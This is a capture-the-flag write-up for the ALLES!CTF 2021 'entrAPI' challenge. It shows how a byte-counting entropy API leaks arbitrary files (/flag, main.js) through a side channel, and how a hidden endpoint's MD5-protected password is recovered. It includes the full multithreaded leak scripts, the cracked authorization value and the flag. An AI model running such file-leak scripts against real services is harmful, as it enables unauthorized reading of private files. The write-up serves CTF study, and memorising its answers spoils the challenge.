# entrAPI - ALLES!CTF 2021


# Challenge Description

EntrAPI

Category: Misc

Difficulty: Medium

Author: Flo

First Blood: Black Bauhinia

Solves: 5 / 523

A very simple stegano tool that estimates the entropy of sections of a file by counting unique bytes in a range. Here's a snippet of the Dockerfile to get you started:

```markdown
COPY main.js index.html flag /
RUN deno cache main.js
EXPOSE 1024
CMD deno run -A main.js
```

Happy guessing! :^)


# Inspection

Inspecting the page source shows us an API endpoint `/query`. It takes a path, a starting position, and a ending position, then counts the unique bytes in a range.

```js
<script>
      const BLOCK_SIZE = 1024;
      async function run() {
          const path = document.getElementById("path").value
          let start = 0
          let end = BLOCK_SIZE
          let rangeEntropy = 1
          document.getElementById("output").textContent = ""
          while (rangeEntropy) {
              const response = await fetch("/query", {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ path, start, end })
              })
              rangeEntropy = (await response.json())["range-entropy"]
              start += BLOCK_SIZE
              end += BLOCK_SIZE
              console.log(`${start}-${end}: ${rangeEntropy} unique bytes`)
              document.getElementById("output").textContent += "\n" + "=".repeat(rangeEntropy)
          }
      }
</script>
```

From there, we wrote our wrapper function to get entropy of a set range in python

```python
PATH = '/flag'
def query(s, e):
    while True: #the remote was weird initially, so try until it works
        try:
            res = r.post(api, json={ "path": PATH, "start": s, "end": e }, headers={'Content-Type': 'application/json'})
            break
        except Exception as E:
            print("[Error]", s, e, E)

    cnt = res.json()["range-entropy"]
    #print(s, e, cnt)
    return cnt
```

# Leaking the flag


The first step is to know the length of the file. By querying [i, i+1] from 0 and incrementing i, we will eventually get to a point where there is no character read, returning an entropy of 0\. At this point, the i will be the length of the file.

But how can we get the content of the file by only knowing the entropy? Lets say if the entropy of a file[s:e] is x, then we know that the entropy of file[s:e+1] will be x+1 if file[e+1] is not in the file[s:e], or x if file[e+1] is in file[s:e]. 

Now do the same thing but with file[s:e] and file[s+1:e], and sweep it from 0 to the length of the file. We can notice that the first time that the entropy of both range is equal means that the character s is in file[s+1:e], or other words character e equals character s. Once we done all of that on every starting character, we can get a relative mapping of what character are the same and what are different.

Implementing this search give us the following code:

```python
LEN = 109 #length of the flag file

#construct the file array with unique identifier for each character
flag = list("ALLES!{")+[f'un_{i}' for i in range(len(test_flag)-8)]+['}'] 

def test(st, ed):
# ed + 1 to accommadate for the ending characture not included in range
    en1 = query(st, ed+1) 
    en2 = query(st+1, ed+1)
    return (en2==en1) #if two entropy is the same, then file[s] is in file[s+1:e]

for st in range(LEN):
		for ed in range(st+1, LEN):
        if test(st, ed)==True:
            flag[ed] = flag[st]
            break

print(flag)
```

However this code is extremely slow especially before the organizers fixed the connection issue, so I used multithreading to request 16 tests at the same time. I also had to add checkpoints so that I can return back to a reasonable point if the session was cleaned by the garbage collection system.

```python
import threading

checkpoint = []
for st, ed in checkpoint:
    if ed!=-1:
        flag[ed] = flag[st]

for st in range(len(checkpoint), LEN):

    #uses a global to gather result from all the cocurrent threads
		global t_res
		t_res = [-1 for i in range(LEN)] 

    for sec in range(st+1, LEN, 16):
        threads = []
        for ed in range(sec, min(sec+16, LEN)): #running 16 tests cocurrently
            threads.append(threading.Thread(target=test, args=(st, ed))) 
            threads[-1].start()
        for thread in threads:
            thread.join()

				#if any test had returned true, we can break from searching
        if True in t_res:break 
    for ed in range(st, LEN):
        if t_res[ed]==True:
            flag[ed] = flag[st]
            checkpoint.append((st, ed))
            break
    else:
        checkpoint.append((st, -1))
    print(checkpoint) #show the current checkpoint
print(flag)
```

PS. In retrospective, we could have done binary search as the result of this test should be false before the first occurrence of the character and true afterward, but I only realized that after the competition. This can make the query count O(NlogN) instead of O(N^2) where N is the length of the file.

The result we get from the flag file is something like this:

```python
['A', 'L', 'L', 'E', 'S', '!', '{', 'un_0', 'un_1', 'un_2', 'un_0', 'un_4', 'un_2', 'un_6', 'un_7', 'un_8', 'un_9', 'un_10', 'un_11', 'un_4', 'un_0', 'un_14', 'un_7', 'un_2', 'un_0', 'un_18', 'un_2', 'un_4', 'un_21', 'un_6', 'un_9', 'un_6', 'un_25', 'un_1', 'un_2', 'un_7', 'un_14', 'un_2', 'un_31', 'un_6', 'un_10', 'un_34',
'un_35', 'un_36', 'un_1', 'un_14', 'un_2', 'un_35', 'un_2', 'un_42', 'un_0', 'un_4', 'un_2', 'un_4', 'un_14', 'un_14', 'un_2', 'un_36', 'un_14', 'un_1', 'un_1', 'un_10', 'un_2', 'un_18', 'un_14', 'un_9', 'un_2', 'un_21', 'un_0', 'un_62', 'un_21', 'un_2', 'un_6', 'un_7', 'un_4', 'un_9', 'un_14', 'un_11', 'un_10', 'un_2', 'un_1', 'un_6', 'un_8', 'un_9', 'un_6', 'un_4', 'un_1', 'un_80', 'un_81', 'un_82', 'un_83', 'un_83', 'A', 'S', 'un_87', 'un_88', 'un_89', 'un_90', 'un_42', 'un_92', 'un_87', 'un_9', 'un_81', 'un_96', 'un_88', 'un_92', 'un_96', 'un_100', '}']
```

We thought that we can just solve cryptogram of this and get the flag, but sadly, there are some random characters appended to the end, so that wasn't possible 😢. We end up with something like this `ALLES!{is it encryption if there's no key?also a bit too lossy for high entropy secrets?????AS????????????}`

# Happy Guessing!


Obviously there are something that we overlooked, maybe there is other ways to leak more information?

Well yes, there are still something we can leak, the `main.js` file. But we have nothing to reference any character from, right? Notice that the given partial Dockerfile uses deno to start the challenge service, we searched several deno examples online and found that the common starting letters for deno project will be `import {...` , so we tried to plug that to the start of the output. After that, we just **guess** through the rest of the file ( at least the relevant part ) and we leaked something like this, where `~` denotes unknown characters.

```python
import { application, router } from "https://deno.land/x/oak@v~.5.0/mod.ts";
import { bold, yellow } from "https://deno.land/std@0.~~.0/fmt/colors.ts";
import { createhash } from "https://deno.land/std@0.~~.0/hash/mod.ts";

const app = new application();
const router = new router();

router.get("/", async (ctx) => {
  ctx.response.body = await deno.readTextFile("index.html");
});

router.get("/flag", async (ctx) => {
  const auth = ctx.request.headers.get('authorization') || '';
  const hasher = createhash("md5");
  hasher.update(auth);
  // NOTE: this is stupid and annoying. remove!
  // F~~~E! crackstation.net knows this hash
  if (hasher.toString("hex") === "e~55~d~b~c~a0~fad~c~~e~5~af~ac~5") {
    ctx.response.body = await deno.readTextFile("flag");
  } else {
    ctx.response.status = 403;
    ctx.response.body = 'go away';
  }
});

router.post("/query", async (ctx) => {
  if (!ctx.request.hasBody) {
    ctx.response.status = 400;
    return;
  }
  const body = ctx.request.body();
  if (body.type !== "json") {
    ctx.response.status = 400;
    ctx.response.body = "expected json body
...
```

Wow! What a surprise, there is a hidden `/flag` endpoint that we can access if we have the hash. However, the complete hash can't be leaked as we don't have enough reference numbers exists in the file, all we have is 0, 3, 4, 5 from the status number and `md5` respectively.  

# Finally The Flag!


So since we don't know the full hash, the next best thing we can do is to list out all the possible hashes, then check if them exists on the hinted site `[crackstation.net](http://crackstation.net)`. Afterall, we know 4 out of 10 total numbers, so there can only be so many options to try.

I wrote a quick script and dumped all possible hashes (720 of them) and check them 20 by 20 on the website, I soon found a partial match, giving us the authorization code `gibflag`

After that it's just sending a request to the `/flag` endpoint with the authorization header, and receive the lovely flag. `ALLES!{is_it_encryption_if_there's_no_key?also_a_bit_too_lossy_for_high_entropy_secrets:MRPPASQHX3b0QrMWH0WF}`

# Appendix - Relevant Files


leakfile.py

```python
import requests as r
import threading

api = "https://7b000000f93af8bd846cf4bd-entrapi.challenge.master.allesctf.net:31337/query"
path = "/main.js"
LEN = 1659
flag = list("ALLES!{")+[f'un_{i}' for i in range(109-7-1)]+['}']
flag = [f'un_{i}' for i in range(LEN)]

def query(s, e):
    while True:
        try:
            res = r.post(api, json={ "path": path, "start": s, "end": e }, headers={'Content-Type': 'application/json'})
            break
        except Exception as E:
            print("[Error]", s, e, E)

    cnt = res.json()["range-entropy"]
    #print(s, e, cnt)
    return cnt

def test(st, ed):
    global t_res
    en1 = query(st, ed+1)
    en2 = query(st+1, ed+1)
    t_res[ed] = (en2==en1)
    return 

checkpoint = []
for st, ed in checkpoint:
    if ed!=-1:
        flag[ed] = flag[st]

for st in range(len(checkpoint), LEN):
    t_res = [-1 for i in range(LEN)]
    for sec in range(st+1, LEN, 16):
        threads = []
        for ed in range(sec, min(sec+16, LEN)):
            threads.append(threading.Thread(target=test, args=(st, ed))) 
            threads[-1].start()
        for thread in threads:
            thread.join()
        if True in t_res:break
    for ed in range(st, LEN):
        if t_res[ed]==True:
            flag[ed] = flag[st]
            checkpoint.append((st, ed))
            break
    else:
        checkpoint.append((st, -1))
    print(checkpoint[-200:])
print(flag)
```

restore.py

```python
checkpoint = []

LEN = 1659
sta = """import { application, router } from "https://deno.land/x/oak@vJ.5.0/mod.ts";
import { bold, yellow } from "https://deno.land/std@0.KL.0/fmt/colors.ts";
import { createhash } from "https://deno.land/std@0.KM.0/hash/mod.ts";

const app = new application();
const router = new router();

router.get("/", async (ctx) => {
  ctx.response.body = await deno.readTextFile("index.html");
});

router.get("/flag", async (ctx) => {
  const auth = ctx.request.headers.get('authorization') || '';
  const hasher = createhash("md5");
  hasher.update(auth);
  // NOTE: this is stupid and annoying. remove?
  // FORCE? crackstation.net knows this hash
  if (hasher.toString("hex") === "e~55~d~b~c~a0~fad~c~~e~5~af~ac~5") {
    ctx.response.body = await deno.readTextFile("flag");
  } else {
    ctx.response.status = 403;
    ctx.response.body = 'go away';
  }
});

router.post("/query", async (ctx) => {
  if (!ctx.request.hasBody) {
    ctx.response.status = 400;
    return;
  }
  const body = ctx.request.body();
  if (body.type !== "json") {
    ctx.response.status = 400;
    ctx.response.body = "expected json body"""

#first contrust the starting array
flag = list(sta)+[f'un_{i}' for i in range(LEN-len(sta))]

#filling the unknown ~ with placeholders
ic=LEN-len(sta)
for i,c in enumerate(flag):
    if '~' in c:
        flag[i] = f'un_{ic}'
        ic+=1

#then store the array from checkpoint
for st, ed in checkpoint:
    if ed!=-1:
        flag[ed] = flag[st]

#now replace the placesholders and print
replaces = {}
acc = 0
import string
tar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
out = ''
for i in flag[:len(checkpoint)]:
    if i in replaces:
        out+=replaces[i]
    elif 'un' not in i:
        out += i
    else:
        out+=tar[acc] #replace unknown char with A~Z for reference and better guessing
        replaces[i] = tar[acc]
	    #out += '~'
	    #replaces[i] = '~'
        acc+=1

print(out)

#correct hash: e7552d9b7c9a01fad1c37e452af4ac95
#authorization: gibflag
#ALLES!{is_it_encryption_if_there's_no_key?also_a_bit_too_lossy_for_high_entropy_secrets:MRPPASQHX3b0QrMWH0WF}
```
